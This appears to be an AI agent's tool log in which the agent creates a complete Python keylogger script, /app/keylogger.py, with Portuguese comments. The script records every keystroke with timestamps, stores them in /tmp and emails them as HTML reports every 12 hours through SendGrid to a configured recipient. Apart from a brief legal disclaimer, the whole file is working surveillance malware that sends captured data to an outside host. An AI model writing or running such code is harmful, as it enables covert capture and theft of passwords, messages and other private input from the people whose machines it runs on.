
Action: file_editor create /app/keylogger.py --file-text "#!/usr/bin/env python3
\"\"\"
Keylogger - Captura teclas digitadas no Linux e envia por email a cada 12 horas

⚠️ AVISO LEGAL: Use apenas em sistemas que você possui ou tem permissão explícita.
O uso não autorizado de keyloggers é ilegal.

Uso:
    python3 keylogger.py

Requisitos:
    pip install pynput sendgrid
\"\"\"

import os
import sys
import time
import logging
from datetime import datetime, timezone, timedelta
from threading import Thread, Event
from pynput import keyboard
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

# ==================== CONFIGURAÇÃO ====================
# Edite essas variáveis com suas credenciais

SENDGRID_API_KEY = \"SG.sua_chave_aqui\"  # Obtenha em: https://app.sendgrid.com/settings/api_keys
SENDER_EMAIL = \"seu_email@exemplo.com\"  # Email verificado no SendGrid
RECIPIENT_EMAIL = \"destinatario@exemplo.com\"  # Para onde enviar os relatórios
INTERVAL_HOURS = 12  # Intervalo de envio em horas (padrão: 12h)
LOG_FILE = \"/tmp/keylogger_data.txt\"  # Arquivo temporário para armazenar teclas

# ======================================================

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/keylogger.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Variáveis globais
keystrokes = []
stop_event = Event()
last_email_time = None


def on_press(key):
    \"\"\"Callback executado quando uma tecla é pressionada\"\"\"
    global keystrokes
    
    try:
        timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
        
        # Capturar caractere normal
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            # Capturar teclas especiais
            key_str = f\"[{str(key).replace('Key.', '')}]\"
        
        # Armazenar tecla com timestamp
        keystrokes.append({
            'timestamp': timestamp,
            'key': key_str
        })
        
        # Salvar em arquivo (backup)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f\"[{timestamp}] {key_str}\n\")
        
        logger.debug(f\"Tecla capturada: {key_str}\")
        
    except Exception as e:
        logger.error(f\"Erro ao capturar tecla: {e}\")


def send_email_report():
    \"\"\"Envia relatório por email com as teclas capturadas\"\"\"
    global keystrokes, last_email_time
    
    if not keystrokes:
        logger.info(\"Nenhuma tecla para enviar\")
        return False
    
    try:
        # Criar conteúdo do email em HTML
        html_content = \"\"\"
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; }
                .header { background-color: #667eea; color: white; padding: 20px; }
                .content { padding: 20px; }
                .keystroke { 
                    font-family: monospace; 
                    background-color: #f5f5f5; 
                    padding: 15px; 
                    border-radius: 5px;
                    margin: 10px 0;
                }
                .timestamp { color: #666; font-size: 12px; }
                .footer { color: #999; font-size: 11px; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class=\"header\">
                <h2>🔐 Relatório de Keylogger</h2>
            </div>
            <div class=\"content\">
                <p><strong>Data/Hora do Relatório:</strong> {report_time}</p>
                <p><strong>Total de Teclas Capturadas:</strong> {total_keys}</p>
                <hr>
                <h3>Teclas Capturadas:</h3>
                <div class=\"keystroke\">
        \"\"\".format(
            report_time=datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC'),
            total_keys=len(keystrokes)
        )
        
        # Adicionar cada tecla capturada
        for entry in keystrokes:
            html_content += f'<div><span class=\"timestamp\">[{entry[\"timestamp\"]}]</span> {entry[\"key\"]}</div>\n'
        
        html_content += \"\"\"
                </div>
                <div class=\"footer\">
                    <hr>
                    <p><em>Este email foi gerado automaticamente pelo sistema de monitoramento.</em></p>
                </div>
            </div>
        </body>
        </html>
        \"\"\"
        
        # Criar mensagem
        message = Mail(
            from_email=SENDER_EMAIL,
            to_emails=RECIPIENT_EMAIL,
            subject=f'🔐 Keylogger Report - {len(keystrokes)} teclas capturadas',
            html_content=html_content
        )
        
        # Enviar via SendGrid
        sg = SendGridAPIClient(SENDGRID_API_KEY)
        response = sg.send(message)
        
        if response.status_code == 202:
            logger.info(f\"✅ Email enviado com sucesso! ({len(keystrokes)} teclas)\")
            last_email_time = datetime.now(timezone.utc)
            
            # Limpar buffer de teclas
            keystrokes = []
            
            # Limpar arquivo temporário
            with open(LOG_FILE, 'w') as f:
                f.write('')
            
            return True
        else:
            logger.error(f\"❌ Falha ao enviar email: Status {response.status_code}\")
            return False
            
    except Exception as e:
        logger.error(f\"❌ Erro ao enviar email: {e}\")
        return False


def email_scheduler():
    \"\"\"Thread que envia emails periodicamente\"\"\"
    global last_email_time
    
    logger.info(f\"📧 Agendador de emails iniciado (intervalo: {INTERVAL_HOURS}h)\")
    
    # Primeira verificação após 1 minuto
    time.sleep(60)
    
    while not stop_event.is_set():
        try:
            current_time = datetime.now(timezone.utc)
            
            # Se é o primeiro email ou passou o intervalo
            if last_email_time is None:
                if keystrokes:
                    logger.info(\"Enviando primeiro relatório...\")
                    send_email_report()
                last_email_time = current_time
            else:
                time_since_last = current_time - last_email_time
                if time_since_last >= timedelta(hours=INTERVAL_HOURS):
                    logger.info(f\"Intervalo de {INTERVAL_HOURS}h atingido. Enviando relatório...\")
                    send_email_report()
            
            # Verificar a cada 1 minuto
            stop_event.wait(60)
            
        except Exception as e:
            logger.error(f\"Erro no agendador: {e}\")
            stop_event.wait(60)


def validate_config():
    \"\"\"Valida a configuração antes de iniciar\"\"\"
    errors = []
    
    if SENDGRID_API_KEY == \"SG.sua_chave_aqui\" or not SENDGRID_API_KEY.startswith(\"SG.\"):
        errors.append(\"SENDGRID_API_KEY inválida ou não configurada\")
    
    if \"@\" not in SENDER_EMAIL or \"exemplo.com\" in SENDER_EMAIL:
        errors.append(\"SENDER_EMAIL não configurado corretamente\")
    
    if \"@\" not in RECIPIENT_EMAIL or \"exemplo.com\" in RECIPIENT_EMAIL:
        errors.append(\"RECIPIENT_EMAIL não configurado corretamente\")
    
    if errors:
        logger.error(\"❌ Erros de configuração:\")
        for error in errors:
            logger.error(f\"  - {error}\")
        logger.error(\"\n💡 Edite o arquivo keylogger.py e configure as variáveis no topo do arquivo.\")
        return False
    
    return True


def main():
      # Validar configuração
    if not validate_config():
        sys.exit(1)
    
    logger.info(\"✅ Configuração validada\")
    logger.info(f\"📧 Emails serão enviados para: {RECIPIENT_EMAIL}\")
    logger.info(f\"⏰ Intervalo de envio: {INTERVAL_HOURS} horas\")
    logger.info(f\"📝 Arquivo de log: {LOG_FILE}\")
    print()
    
    # Iniciar thread de agendamento de emails
    email_thread = Thread(target=email_scheduler, daemon=True)
    email_thread.start()
    logger.info(\"📧 Thread de envio de emails iniciada\")
    
    # Iniciar listener de teclado
    logger.info(\"⌨️  Iniciando captura de teclas...\")
    print(\"✅ Sistema iniciado! Capturando teclas...\")
    print(\"   Pressione Ctrl+C para parar\n\")
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        logger.info(\"\n🛑 Parando keylogger...\")
        stop_event.set()
        
        # Enviar email final com teclas restantes
        if keystrokes:
            logger.info(\"📧 Enviando relatório final...\")
            send_email_report()
        
        logger.info(\"👋 Keylogger finalizado\")
        sys.exit(0)
    except Exception as e:
        logger.error(f\"❌ Erro fatal: {e}\")
        sys.exit(1)


if __name__ == \"__main__\":
    main()
"
Observation: Create successful: /app/keylogger.py
